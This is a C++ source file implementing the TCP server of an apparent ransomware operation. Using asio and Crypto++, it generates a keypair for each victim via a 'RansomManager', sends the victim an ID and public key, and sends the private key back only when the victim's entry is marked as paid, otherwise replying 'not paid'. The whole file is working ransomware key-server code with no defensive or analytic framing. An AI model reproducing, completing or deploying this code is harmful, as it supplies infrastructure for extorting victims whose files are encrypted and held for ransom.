#include "TcpConnection.h"

TcpConnection::pointer TcpConnection::create(asio::io_service & io_service, RansomManager & ransomManager)
{
	return pointer(new TcpConnection(io_service, ransomManager));
}

asio::ip::tcp::socket & TcpConnection::socket()
{
	return socket_;
}

void TcpConnection::start()
{
	auto command = std::make_shared<Commands>();
	auto self = shared_from_this();
	socket().async_read_some(asio::buffer(reinterpret_cast<uint8_t*>(command.get()), sizeof(Commands)), [self, command](const asio::error_code& error, std::size_t size) {
		if (error)
		{
			std::cerr << error.value() << " " << error.message() << "\n";
			return;
		}

		switch (*command)
		{
		case Commands::GET_PUBLIC_KEY:
			std::cout << "Command GET_PUBLIC_KEY\n";
			self->sendPublicKey();
			break;
		case Commands::GET_PRIVATE_KEY:
			std::cout << "Command GET_PRIVATE_KEY\n";
			self->sendPrivateKey();
			break;
		default:
			std::cerr << "Unknown Command " << command << "\n";
			break;
		}
	});
}

void TcpConnection::sendPublicKey()
{
	std::cout << "Creating Keypair\n";
	RansomEntry ransomEntry = ransomManager_.createEntry();
	std::string publicKeyContent;
	ransomEntry.publicKey().GetGroupParameters().GetCurve().EncodePoint(CryptoPP::Base64Encoder(new CryptoPP::StringSink(publicKeyContent)), ransomEntry.publicKey().GetPublicElement(), true);
	publicKeyContent.erase(std::remove(publicKeyContent.begin(), publicKeyContent.end(), '\n'), publicKeyContent.end());

	auto messageContent = std::make_shared<std::string>();
	*messageContent += std::to_string(ransomEntry.clientId());
	*messageContent += "\n" + publicKeyContent;

	std::cout << "Sending data:\n" << *messageContent << "\n\n";

	auto self = shared_from_this();
	socket_.async_write_some(asio::buffer(*messageContent), [self, messageContent](const asio::error_code& error, std::size_t bytes_written) {
		if (error)
		{
			std::cerr << error.message() << "\n";
			return;
		}
		self->socket().shutdown(asio::ip::tcp::socket::shutdown_both);
		self->socket().close();
	});
}

void TcpConnection::sendPrivateKey()
{
	auto clientId = std::make_shared<std::uint64_t>();
	auto self = shared_from_this();
	auto& ransomManager = this->ransomManager_;
	socket_.async_read_some(asio::buffer(reinterpret_cast<char*>(clientId.get()), sizeof(clientId)), [self, &ransomManager, clientId](const asio::error_code& error, std::size_t bytes_read) {
		if (error)
		{
			std::cerr << error.message() << "\n";
			return;
		}
		RansomEntry ransomEntry = ransomManager.getEntry(*clientId);
		auto privateKeyContent = std::make_shared<std::string>();
		std::cout << "Checking if client has paid\n";
		if (ransomEntry.hasPaid())
		{
			std::cout << "Payment status: true\n";
			std::string raw_privatekey;
			ransomEntry.privateKey().GetPrivateExponent().DEREncode(CryptoPP::StringSink(raw_privatekey));

			CryptoPP::StringSource(raw_privatekey, true,
				new CryptoPP::Base64Encoder(
					new CryptoPP::StringSink(*privateKeyContent)
				)
			);
		}
		else
		{
			std::cout << "Payment status: false\n";
			*privateKeyContent = "not paid";
		}
		std::cout << "Sending data:\n" << *privateKeyContent << "\n\n";
		self->socket().async_write_some(asio::buffer(*privateKeyContent), [self, privateKeyContent](const asio::error_code& error, std::size_t bytes_written) {
			if (error)
			{
				std::cerr << error.message() << "\n";
				return;
			}

			self->socket().shutdown(asio::ip::tcp::socket::shutdown_both);
			self->socket().close();
		});
	});

}

TcpConnection::TcpConnection(asio::io_service & io_service, RansomManager & ransomManager)
	: socket_(io_service)
	, ransomManager_(ransomManager)
{}
